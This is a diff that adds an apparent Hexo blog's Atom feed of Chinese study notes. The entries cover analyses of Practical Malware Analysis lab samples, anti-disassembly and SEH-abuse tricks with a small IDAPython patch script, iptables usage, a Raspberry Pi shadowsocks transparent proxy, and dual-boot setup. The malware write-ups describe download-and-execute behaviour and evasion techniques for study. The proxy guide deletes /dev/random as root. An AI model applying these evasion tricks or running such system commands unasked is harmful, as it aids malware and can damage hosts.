@@ -1,0 +1,563 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>learn_malware</title>
+  
+  <subtitle>学习使我快乐，学习使我沉迷</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://18428381824.github.io/"/>
+  <updated>2017-10-25T12:17:26.608Z</updated>
+  <id>http://18428381824.github.io/</id>
+  
+  <author>
+    <name>zwj</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>对抗反汇编分析</title>
+    <link href="http://18428381824.github.io/2017/10/22/%E5%AF%B9%E6%8A%97%E5%8F%8D%E6%B1%87%E7%BC%96%E5%88%86%E6%9E%90/"/>
+    <id>http://18428381824.github.io/2017/10/22/对抗反汇编分析/</id>
+    <published>2017-10-21T16:00:00.000Z</published>
+    <updated>2017-10-25T12:17:26.608Z</updated>
+    
+    <content type="html"><![CDATA[<p>1.样本是恶意代码实战中的Lab15-03.exe。</p><p>2.IDA 打开发现在00401016处有标红，IDA识别出了一些异常，仔细分析发现，把0x40148c写到了ebp+4的位置，而这个位置刚好是main函数返回地址的位置，通过改写此处的内容让main返回的时候执行0x40148c位置处的代码。</p><p><img src="https://i.imgur.com/vd4KEI6.png" alt=""></p><p>2.由此可看出主函数应该是非常正常，不会看出有什么恶意的地方。分析0x40148c处的代码。你此处的代码在0x401496处，有明显标红，说明有反汇编异常，一般都是恶意代码作者故意制作的来影响反汇编的结果。此处是一个很明显的对抗反汇编，上一步是跳转到401497的位置，而这个位置是jmp 这条指令的中间，这显然是不可能的，在此处按d键，把代码转为数据显示，然后把401497后面的数据按c键再转回代码，注意对齐。然后把401496位置的数据改为nop,可以通过Edit-&gt;Patch Program-&gt;change word ,把E9改为90，然后按c转换为代码就可以了。效果如图</p><p><img src="https://i.imgur.com/Qtl0ZFP.png" alt=""></p><p>继续往下看，发现有一个除零异常出现 ，</p><p><img src="https://i.imgur.com/ng6kIn0.png" alt=""></p><p>显然恶意代码先把异常处理函数的地址存到FS寄存器，然后出发除零异常执行此处的函数。显此处显然异常处理函数的地址是0x4014c0，而0x4014c0位置处的IDA没有识别为代码。按c键来转换为代码，继续向下看，在0x4014D7位置处，又出现了一个与0x401496处的相似的异常，同样的方法进行处理，结果如图</p><p><img src="https://i.imgur.com/d8PyGdS.png" alt=""></p><p>这个估计就是恶意代码真正要做的事情的代码了。继续向下看，有个URLDownloadToFileA函数，显然很恶意。下面还有个反汇编异常先处理了，先D后C，然后结果如下，</p><p><img src="https://i.imgur.com/0TKYBzh.png" alt=""></p><p>到此整个代码就分析完了，主要是4014c0处是真正要关注的，下面分析这个位置的代码</p><p><img src="https://i.imgur.com/KPoVtCC.png" alt=""><br><img src="https://i.imgur.com/ue6meMj.png" alt=""></p><p>主要关注标红的位置，此处看不出什么来，在OD中实际执行一下来看。</p><p>直接在0x40148c处下断点，然后直接f9运行到此处，若看到一堆数据，右键分析-&gt;从模块中删除分析就可以了，改写相应位置的异常按照IDA那样，实验过程发现se处理程序的确是0x4014c0但是程序并没有跳到那个位置而是终止了，没搞明白，为了真正看到0x4014c0处的具体执行情况。我选择直接编辑汇编代码。写入jmp 0x4014c0,</p><p><img src="https://i.imgur.com/kijEK2T.png" alt=""></p><p>发现在0x4014db处好像也是异常终止了，后改为</p><p><img src="https://i.imgur.com/yhPNUnh.png" alt=""></p><p>正常了、<br>然后在四个函数处下断点观察参数信息和返回信息，</p><p><img src="https://i.imgur.com/KK9LVGS.png" alt=""></p><p>0x401534明显是一个解密函数，然后把网址和文件就解密出来，然后URLDownloadToFileA下载，winexec 执行下载的文件。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;1.样本是恶意代码实战中的Lab15-03.exe。&lt;/p&gt;
+&lt;p&gt;2.IDA 打开发现在00401016处有标红，IDA识别出了一些异常，仔细分析发现，把0x40148c写到了ebp+4的位置，而这个位置刚好是main函数返回地址的位置，通过改写此处的内容让main返回的
+      
+    
+    </summary>
+    
+      <category term="逆向" scheme="http://18428381824.github.io/categories/%E9%80%86%E5%90%91/"/>
+    
+    
+      <category term="逆向" scheme="http://18428381824.github.io/tags/%E9%80%86%E5%90%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>iptables</title>
+    <link href="http://18428381824.github.io/2017/10/20/iptables/"/>
+    <id>http://18428381824.github.io/2017/10/20/iptables/</id>
+    <published>2017-10-19T16:00:00.000Z</published>
+    <updated>2017-10-25T03:44:43.448Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>&emsp;&emsp;当主机收到一个数据包后，数据包先在内核空间中处理，若发现目的地址是自身，则传到用户空间中交给对应的应用程序处理，若发现目的不是自身，则会将包丢弃或进行转发。</p><p>&emsp;&emsp;iptables实现防火墙功能的原理是：在数据包经过内核的过程中有五处关键地方，分别是PREROUTING、INPUT、OUTPUT、FORWARD、POSTROUTING，称为钩子函数，iptables这款用户空间的软件可以在这5处地方写规则，对经过的数据包进行处理，规则一般的定义为“如果数据包头符合这样的条件，就这样处理数据包”。</p><p>&emsp;&emsp;iptables中定义有表，分别表示提供的功能，有filter表（实现包过滤）、nat表（实现网络地址转换）、mangle表（实现包修改）、raw表（实现数据跟踪），这些表具有一定的优先级：raw–&gt;mangle–&gt;nat–&gt;filter</p><p><img src="https://i.imgur.com/Fl0nfg8.png" alt=""></p><p><img src="https://i.imgur.com/OHQyUMC.png" alt=""></p><h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><p>&amp;emsp常用操作命令    说明</p><p>-A    在指定链尾部添加规则</p><p>-D    删除匹配的规则</p><p>-R    替换匹配的规则</p><p>-I    在指定位置插入规则</p><pre><code>例：iptables -I INPUT 1 --dport 80 -j ACCEPT（将规则插入到filter表INPUT链中的第一位上）</code></pre><p>-L/S    列出指定链或所有链的规则</p><p>-F    删除指定链或所有链的规则</p><p>-N    创建用户自定义链</p><pre><code>例：iptables -N allowed</code></pre><p>-X    删除指定的用户自定义链</p><p>-P    为指定链设置默认规则策略，对自定义链不起作用</p><pre><code>例：iptables -P OUTPUT DROP</code></pre><p>-Z    将指定链或所有链的计数器清零</p><p>-E    更改自定义链的名称</p><pre><code>例：iptables -E allowed disallowed</code></pre><p>-n    ip地址和端口号以数字方式显示</p><pre><code>例：iptables -Ln</code></pre><p>常见规则匹配器    说明</p><p>-p tcp|udp|icmp|all    匹配协议，all会匹配所有协议</p><p>-s addr[/mask]    匹配源地址</p><p>-d addr[/mask]    匹配目标地址</p><p>–sport port1[:port2]    匹配源端口(可指定连续的端口）</p><p>–dport port1[:port2]    匹配目的端口(可指定连续的端口）</p><p>-o interface    匹配出口网卡，只适用FORWARD、POSTROUTING、OUTPUT。</p><pre><code>例：iptables -A FORWARD -o eth0</code></pre><p>-i interface    匹配入口网卡，只使用PREROUTING、INPUT、FORWARD。</p><p>–icmp-type     匹配icmp类型（使用iptables -p icmp -h可查看可用的ICMP类型<br>）</p><p>–tcp-flags mask comp    匹配TCP标记，mask表示检查范围，comp表示匹配mask中的哪些标记。</p><pre><code>例：iptables -A FORWARD -p tcp --tcp-flags ALL SYN，ACK -j ACCEPT（表示匹配SYN和ACK标记的数据包）</code></pre><p>目标动作    说明</p><p>ACCEPT    允许数据包通过</p><p>DROP    丢弃数据包</p><p>REJECT    丢弃数据包，并且将拒绝信息发送给发送方</p><p>SNAT    源地址转换（在nat表上）</p><pre><code>例：iptables -t nat -A POSTROUTING -d 192.168.0.102 -j SNAT --to 192.168.0.1 </code></pre><p>DNAT    目标地址转换（在nat表上）</p><pre><code>例：iptables -t nat -A PREROUTING -d 202.202.202.2 -j DNAT --to-destination 192.168.0.102</code></pre><p>REDIRECT    目标端口转换（在nat表上）</p><pre><code>例：iptables -t nat -D PREROUTING -p tcp --dport 8080 -i eth2.2 -j REDIRECT --to 80</code></pre><p>MARK    将数据包打上标记</p><pre><code>例：iptables -t mangle -A PREROUTING -s 192.168.1.3 -j MARK --set-mark 60</code></pre><h3 id="注意要点："><a href="#注意要点：" class="headerlink" title="注意要点："></a>注意要点：</h3><pre><code>1、目标地址转换一般在PREROUTING链上操作2、源地址转换一般在POSTROUTING链上操作</code></pre><p>state：匹配指定的状态数据包</p><p>参数    说明</p><p>–state value    value可以为NEW、RELATED（有关联的）、ESTABLISHED、INVALID（未知连接）</p><p>例子：<br>    iptables -A INPUT -m state –state NEW，ESTABLISHED -j ACCEPT</p><h2 id="常见iptables"><a href="#常见iptables" class="headerlink" title="常见iptables"></a>常见iptables</h2><p>&emsp;&emsp;MASQUERADE：是动态分配ip时用的IP伪装：在nat表的POSTROUTING链加入一条规则:所有从ppp0口送出的包会被伪装（MASQUERADE）</p><p> iptables -t nat -A POSTROUTING -o ppp0 -j MASQUERADE</p><p>&emsp;&emsp;REDIRECT：重定向，这个在squid透明代理时肯定要用到它</p><p> 所有从eth1进入的请求80和82端口的数据，被转发到80端口，由squid处理。</p><p> iptables -t nat -A PREROUTING - -i eth1 -p tcp -m multiport –dports 80,82 -j REDIRECT –to-ports 80</p><p>保存和恢复iptables规则</p><p>使用iptables-save可以保存到特定文件中</p><p>&emsp;&emsp;iptables-save &gt;/etc/sysconfig/iptables_save</p><p>使用iptables-restore可以恢复规则</p><p>&emsp;&emsp;iptables-restore&lt;/etc/sysconfig/iptables_save</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;当主机收到一个数据包后，数据包先在内核空间中处理，若发现目的地址是自身，则传到用户空间中交给对应的应用程序处理，若发
+      
+    
+    </summary>
+    
+      <category term="网络" scheme="http://18428381824.github.io/categories/%E7%BD%91%E7%BB%9C/"/>
+    
+    
+      <category term="网络" scheme="http://18428381824.github.io/tags/%E7%BD%91%E7%BB%9C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>对抗反汇编</title>
+    <link href="http://18428381824.github.io/2017/10/16/%E5%AF%B9%E6%8A%97%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
+    <id>http://18428381824.github.io/2017/10/16/对抗反汇编/</id>
+    <published>2017-10-15T16:00:00.000Z</published>
+    <updated>2017-10-25T07:18:53.412Z</updated>
+    
+    <content type="html"><![CDATA[<p>1.插入流氓字节，阻止真正的指令被反汇编</p><blockquote><p>线性反汇编和面向代码流的反汇编：</p><p>线性反汇编是遍历一个代码段，一次一条指令的线性反汇编，不考虑代码流的控制指令。而面向代码流的反汇编是会检查每一条指令。然后建立反汇编的地址列表，然后这样的反汇编算法会更加先进，而不易出错。比如：</p></blockquote><pre><code>.text:00401035                 jz      short near ptr loc_401037+1.text:00401037.text:00401037 loc_401037:                             ; CODE XREF: .text:00401035j.text:00401037                 call    near ptr 8B4C55C7h</code></pre><blockquote><p>观察以上的汇编代码，你会发现jz跳转到了call 指令中间，这显然是不可能的，所以call指令一定是一个数据而不是代码，在此处按d键，然后再观察</p><pre><code>                 xor     eax, eax.text:00401035                 jz      short loc_401038.text:00401035 ; ---------------------------------------------------------------------------.text:00401037                 db 0E8h.text:00401038 ; ---------------------------------------------------------------------------.text:00401038.text:00401038 loc_401038:                             ; CODE XREF: .text:00401035j.text:00401038                 mov     eax, [ebp+0Ch]</code></pre><p>这样显然很正确了，对于call 指令而言，如果后面四个字节跟的是地址，它对应的机器码是0xe8，此处显然是把数据0xe8当成了call指令，才会出现这样的问题。</p></blockquote><p>2.固定条件的跳转指令</p><pre><code>   xor     eax, eax.text:00401035                 jz      short loc_401038</code></pre><p>3.函数指针问题 </p><pre><code> mov [ebp+var_4],offset sub_4011c0; call [ebp+var_4]可用IDA脚本语言IDC进行修正函数为AddCodeXref();</code></pre><p>3.函数未识别的问题 </p><blockquote><p>可以按p键来强制把一段代码变成函数<br>但是要把流氓字节nop,不然函数可能会出问题。用IDA自带的patch program来做。<br>也可用脚本idapython  代码如下：</p></blockquote><pre><code>import idaapiidaapi.CompileLine(&apos;static n_key(){ RunPythonStatement(&quot;nopIt()&quot;);}&apos;)AddHotkey(&quot;Alt-N&quot;,&quot;n_key&quot;)def nopIt():    start=ScreenEA()    end=NextHead(start)    for ea in range(start,end):        PatchByte(ea,0x90)    Jump(end)</code></pre><p>4，异常触发</p><pre><code>push offset sub_4014c0push large dword ptr fs:0mov large fs:0,espxor ecx,ecxdiv ecx</code></pre><blockquote><p>属于滥用结构化异常（SEH）来对抗反汇编，通过人为构造一些比如访问一个无效的内存区域，除0等来触发异常，</p><p>SHE链是一个函数列表，处理线程的异常，列表中的函数要么处理异常，要么向下传递，如果传递到最后一个异常处理函数，就会被认为是一个不能处理的异常，弹出“an unhandled exception has occurred ”。</p><p>查找SEH链，操作系统会检查FS寄存器，这个寄存器中包含一个段选择子，从概念上来讲，链表以栈的方式工作，第一个调用的是最后一个加入链表的记录。前面的例子就是把自己的异常处理加入到链表的头部，然后用除0来触发异常，进而执行自己的代码。</p></blockquote>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;1.插入流氓字节，阻止真正的指令被反汇编&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;线性反汇编和面向代码流的反汇编：&lt;/p&gt;
+&lt;p&gt;线性反汇编是遍历一个代码段，一次一条指令的线性反汇编，不考虑代码流的控制指令。而面向代码流的反汇编是会检查每一条指令。然后建立反汇编的地址列表，
+      
+    
+    </summary>
+    
+      <category term="逆向" scheme="http://18428381824.github.io/categories/%E9%80%86%E5%90%91/"/>
+    
+    
+      <category term="逆向" scheme="http://18428381824.github.io/tags/%E9%80%86%E5%90%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>恶意代码重定向</title>
+    <link href="http://18428381824.github.io/2017/10/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91/"/>
+    <id>http://18428381824.github.io/2017/10/16/恶意代码重定向/</id>
+    <published>2017-10-15T16:00:00.000Z</published>
+    <updated>2017-10-25T07:11:55.201Z</updated>
+    
+    <content type="html"><![CDATA[<p>&emsp;1.首先用strings查看字符串，发现<a href="http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：" target="_blank" rel="external">http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：</a></p><pre><code>/abcdefghijklmnopqrstuvwxyz0123456789:.以及CreateFile，CreateProcessA，InternetReadFileInternetCloseHandleInternetOpenUrlAInternetOpenAWININET.dllURLDownloadToCacheFileA </code></pre><p>&emsp;&emsp;显式调用高层API COM接口，以及Wininet 接口函数。<br><img src="https://i.imgur.com/ODPMB8W.png" alt=""><br><img src="https://i.imgur.com/qDJ4DI5.png" alt=""><br>这些函数，这些都是重要信息需要关注的。</p><p>&emsp;&emsp;2.IDA加载程序分析，首先是401457函数，调用了CreateFileA和ReadFile函数，具体分析发现是打开’C:\autobat.exe’,失败了调用函数，分析可知是把’<a href="http://www.practicalmalwareanalysis.com/start.htm&#39;,0写入文件C:\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息，" target="_blank" rel="external">http://www.practicalmalwareanalysis.com/start.htm&#39;,0写入文件C:\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息，</a> 首先搜索&lt;no’字符串，然后调用401000函数，</p><p><img src="https://i.imgur.com/ht0pUfZ.png" alt=""></p><p>&emsp;&emsp;进去分析发现是对&lt;noscript标签的不规则比较，然后对判断是否后面会有<a href="http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。" target="_blank" rel="external">http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。</a></p><p><img src="https://i.imgur.com/akX3WUw.png" alt=""></p><p>&emsp;&emsp;函数401000成功返回1，然后4011f3也返回1，最后执行401684函数，函数有两个参数，一个是刚刚的a3，另一个是v6的地址。v6=1,打开401684函数进行分析，是现实strtok函数，把字符串分为两部分，分别赋给两变量，然后是个case语句，当发现首字母为d时，执行401565函数，分析401565函数，首先是401147函数初步分析发现是个解码函数，然后后面是URLDownloadToCacheFileA，CreateProcessA函数，是把下载的程序运行起来。首字母为n时，v6置1，首字母为s时，sleep特定的时间，首字母为r时，运行401651函数，进去函数进行分析，发现又是刚刚那个解码函数401147，然后再次调用write_url函数，由此可以知道应该是个url重定向。到此整个样本就已经分析结束了。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&amp;emsp;1.首先用strings查看字符串，发现&lt;a href=&quot;http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：&quot; target=&quot;_b
+      
+    
+    </summary>
+    
+      <category term="逆向" scheme="http://18428381824.github.io/categories/%E9%80%86%E5%90%91/"/>
+    
+    
+      <category term="逆向" scheme="http://18428381824.github.io/tags/%E9%80%86%E5%90%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>树莓派透明代理</title>
+    <link href="http://18428381824.github.io/2017/10/16/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86/"/>
+    <id>http://18428381824.github.io/2017/10/16/树莓派透明代理/</id>
+    <published>2017-10-15T16:00:00.000Z</published>
+    <updated>2017-10-25T11:46:28.532Z</updated>
+    
+    <content type="html"><![CDATA[<p>1.安装vim</p><p>连网之后，首先安装vim,便于后面的配置文件的编写。</p><pre><code>sudo apt-get install vim</code></pre><p>2.静态ip  </p><p>图形界面貌似会失败，建议在配置文件里改：</p><pre><code>sudo vim /etc/dhcpcd.conf</code></pre><p>填写以下内容</p><pre><code>interface eth0static ip_address=ipstatic routers=网关static domain_name_servers=223.5.5.5</code></pre><p>3.配置路由转发：</p><pre><code>sudo vim  /etc/sysctl.conf</code></pre><p>设置：</p><pre><code>net.ipv4.ip_forward=1</code></pre><p>4.ssh开机自启动</p><p>&emsp;&emsp;ssh 连接树莓派还是很放方面的，不用每次都去接键盘之类的<br>但是树莓派的ssh 默认是不自启动的，在/etc/rc.local中添加</p><pre><code>sudo /etc/init.d/ssh start (exit 之前)</code></pre><p>5.shadowssocks 安装</p><p>建议pip 安装</p><blockquote><p>sudo pip install  shadowsocks<br>就可以了然后就是配置文件的编写</p><p>sudo mkdir /etc/shadowsocks<br>sudo touch /etc/shadowsocks/shadowsocks.json</p></blockquote><p>添加以下内容</p><pre><code>{     &quot;server&quot;:&quot;127.0.0.1&quot;,    &quot;server_port&quot;:ss服务器端口,    &quot;local_address&quot;:&quot;0.0.0.0&quot;,    &quot;local_port&quot;:1080,    &quot;password&quot;:&quot;ss密码&quot;,    &quot;timeout&quot;:600,    &quot;method&quot;:&quot;aes-256-cfb&quot;}</code></pre><p>6.redsocks安装</p><pre><code>git clone git@github.com:darkk/redsocks.git（克隆失败可以在其他地方下载后传过来） sudo apt-get install libevent-dev cd redsocksmake</code></pre><p>在redsocks 文件夹中有redsocks.conf.example<br>把它复制出来，重命名为 redsocks.conf<br>我习惯放在/etc目录下即/etc/redsocks.conf<br>然后编辑配置文件</p><pre><code>local_ip =0.0.0.0 ;local_port = 12345; 自己定义后面iptables要用ip = 127.0.0.1;port = 1080;</code></pre><p>7.kcptun 加速器的安装</p><p>Kcptun的作用主要是配合SS用来做加速。</p><p>下载地址</p><blockquote><p><a href="https://github.com/xtaci/kcptun/releases/latest" target="_blank" rel="external">https://github.com/xtaci/kcptun/releases/latest</a></p></blockquote><p>选择kcptun-linux-arm 那一个下载解压</p><blockquote><p>tar -zxf kcptun-linux-arm*.tar.gz<br>选择适合你的树莓派的二进制文件我选择的是client_linux_arm7 。</p></blockquote><p>创建配置文件如下：</p><pre><code>{  &quot;localaddr&quot;: &quot;:8888&quot;,  &quot;remoteaddr&quot;: &quot;服务器ip:端口&quot;,  &quot;key&quot;: &quot;very fast&quot;,  &quot;crypt&quot;: &quot;aes-128&quot;,  &quot;mode&quot;: &quot;fast2&quot;,  &quot;mtu&quot;: 1400,  &quot;sndwnd&quot;: 256,  &quot;rcvwnd&quot;: 2048,  &quot;datashard&quot;: 10,  &quot;parityshard&quot;: 3,  &quot;dscp&quot;: 46,  &quot;nocomp&quot;: false}</code></pre><p>然后把client_linux_arm7放到/usr/local/bin 里面<br>运行</p><blockquote><p>sudo client_linux_arm7 -c 配置文件<br>就可以了。</p></blockquote><p>8.iptabels </p><pre><code>sudo sslocal -c /etc/shadowsocks/shadowsocks.json &amp; &gt; /dev/null 2&gt;&amp;1 sudo redsocks -c /etc/redsocks/redsocks.conf &amp; &gt; /dev/null 2&gt;&amp;1 sudo iptables -t nat -N REDSOCKS sudo iptables -t nat -A REDSOCKS -d 0.0.0.0 -j RETURN sudo iptables -t nat -A REDSOCKS -d 127.0.0.0/8 -j RETURN sudo iptables -t nat -A REDSOCKS -d 192.168.0.0/16 -j RETURN sudo iptables -t nat -A REDSOCKS -d 10.0.0.0/16 -j RETURN sudo iptables -t nat -A REDSOCKS -d 服务器IP -j RETURN sudo iptables -t nat -A REDSOCKS -p tcp -j REDIRECT --to-ports 12345 sudo iptables -t nat -A OUTPUT -p tcp -j REDSOCKS sudo iptables -t nat -A PREROUTING -i eth0 -p tcp -j REDSOCKS</code></pre><p>9.此时你把局域网其他电脑设置成它还是不能上网，因为存在dns 问题通过安装dnsmasq来解决</p><pre><code>sudo apt-get install dnsmasq</code></pre><p>配置文件在 /etc/dnsmasq.conf<br>编辑配置文件<br>取消no-resolv前面的注释<br>加入 </p><pre><code>server=202.38.93.153 server=202.141.162.123</code></pre><p>保存重启dnsmasq  </p><pre><code>sudo service dnsmasq restart</code></pre><p>此时不出意外的话应该是可以把局域网内的其他主机网关s设置成 树莓派的ip ,然后实现透明上网。<br>建议dns 设置成</p><pre><code>server=202.38.93.153 server=202.141.162.123</code></pre><p>10 .善后工作<br>把上述的配置加入启动项</p><pre><code>sudo /etc/init.d/ssh startsudo client_linux_arm7 -c /home/pi/Desktop/configus.txt  &amp; &gt; /dev/null 2&gt;&amp;1sudo sslocal -c /etc/shadowsocks-libev/ss.conf &amp; &gt; /dev/null 2&gt;&amp;1sudo redsocks -c /etc/redsocks.conf &amp; &gt; /dev/null 2&gt;&amp;1sudo service dnsmasq restart</code></pre><p>附加：<br>热点配置<br>安装hostapd </p><pre><code>sudo apt-get install hostapd</code></pre><p>配置文件/etc/hostapd/hostapd.conf </p><pre><code>interface=wlan0 hw_mode=g channel=10 auth_algs=1 wpa=2 wpa_key_mgmt=WPA-PSK wpa_pairwise=CCMP rsn_pairwise=CCMP wpa_passphrase=wifi密码 ssid=wifi名字</code></pre><p>dnsmasq 配置文件/etc/dnsmasq.conf 中修改</p><pre><code>interface=wlan0dhcp-range=10.0.0.2,10.0.0.255,255.255.255.0,12h</code></pre><p>在启动项中/etc/rc.local 增加：</p><pre><code>sudo ifconfig wlan0 down sudo ifconfig wlan0 10.0.0.1 netmask 255.255.255.0 up sudo rm -rf /dev/random sudo ln -s /dev/urandom /dev/random sudo service dnsmasq restart sudo hostapd -B /etc/hostapd/hostapd.conf &amp; &gt; /dev/null 2&gt;&amp;1sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT</code></pre><p>以及在/etc/iptables 中增加</p><pre><code>sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp -j REDSOCKS</code></pre><p>参考网址：<br><a href="http://fishedee.com/%E5%90%8E%E7%AB%AF/2016/11/30/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9A%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86.html" target="_blank" rel="external">http://fishedee.com/%E5%90%8E%E7%AB%AF/2016/11/30/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9A%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86.html</a></p><p><a href="http://www.jianshu.com/p/05d32b4e8fc0" target="_blank" rel="external">http://www.jianshu.com/p/05d32b4e8fc0</a></p><p><a href="http://blog.uiideas.com/2016/09/16/Kcptun%E4%BD%BF%E7%94%A8/" target="_blank" rel="external">http://blog.uiideas.com/2016/09/16/Kcptun%E4%BD%BF%E7%94%A8/</a></p><p><a href="https://story.tonylee.name/2016/03/31/yong-shu-mei-pai-da-zao-wu-xian-zhong-ji-ke-xue-shang-wang-lu-you-qi/" target="_blank" rel="external">https://story.tonylee.name/2016/03/31/yong-shu-mei-pai-da-zao-wu-xian-zhong-ji-ke-xue-shang-wang-lu-you-qi/</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;1.安装vim&lt;/p&gt;
+&lt;p&gt;连网之后，首先安装vim,便于后面的配置文件的编写。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo apt-get install vim
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.静态ip  &lt;/p&gt;
+&lt;p&gt;图形界面貌似会失败，建议在配置文件里改：&lt;/p
+      
+    
+    </summary>
+    
+      <category term="杂学" scheme="http://18428381824.github.io/categories/%E6%9D%82%E5%AD%A6/"/>
+    
+    
+      <category term="杂学" scheme="http://18428381824.github.io/tags/%E6%9D%82%E5%AD%A6/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>双系统安装（win10+ubuntu）</title>
+    <link href="http://18428381824.github.io/2017/10/16/%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/"/>
+    <id>http://18428381824.github.io/2017/10/16/双系统安装/</id>
+    <published>2017-10-15T16:00:00.000Z</published>
+    <updated>2017-10-25T07:36:25.876Z</updated>
+    
+    <content type="html"><![CDATA[<p>1.我选择的 是win10加ubuntu双系统。</p><p>2.准备工作</p><pre><code>U盘一个16gwin10系统ubuntu系统</code></pre><p>3.备份好硬盘数据以后，空出一个分区，然后制作一个PE盘，然后进PE删除这个分区，使其处于未分配的空间状态，用于安装ubuntu ,然后安装win10，这个就不用多说了，大家都会。</p><p>4.安装结束以后，用大白菜iso装机方式，把ubuntu系统直接写入U盘，然后U盘其启动即可进入装机状态。</p><p>其他的跟一般装ubuntu一样，在分区那个位置，选择其他方式，选择手动分区，然后选择刚刚那个未分配空间，一般可以分4个分区。/boot 200M,swap分区视内存定,一般可以和内存一样大，然后剩下分/，15g-20g左右，剩下的可以全部给/home。引导驱动器选择/boot,然后继续安装正常方式来装就好了。</p><p>4.此时两个系统都安好了，但是此时还是默认win10启动，此时最重要的来了，下载一个叫EasyBCD的软件，选择添加新条目，然后选择Linux，然后名称，驱动器选择/boot对应的就好了。此时重启你就会发现有两个候选操作系统了。</p><p><img src="https://i.imgur.com/prFcTXH.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;1.我选择的 是win10加ubuntu双系统。&lt;/p&gt;
+&lt;p&gt;2.准备工作&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;U盘一个16g
+win10系统
+ubuntu系统
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.备份好硬盘数据以后，空出一个分区，然后制作一个PE盘，然后进PE删除这个分区，使
+      
+    
+    </summary>
+    
+      <category term="杂学" scheme="http://18428381824.github.io/categories/%E6%9D%82%E5%AD%A6/"/>
+    
+    
+      <category term="杂学" scheme="http://18428381824.github.io/tags/%E6%9D%82%E5%AD%A6/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>dll注入之APC注入</title>
+    <link href="http://18428381824.github.io/2017/09/16/dll%E4%B9%8BAPC%E6%B3%A8%E5%85%A5/"/>
+    <id>http://18428381824.github.io/2017/09/16/dll之APC注入/</id>
+    <published>2017-09-15T16:00:00.000Z</published>
+    <updated>2017-10-25T07:05:57.958Z</updated>
+    
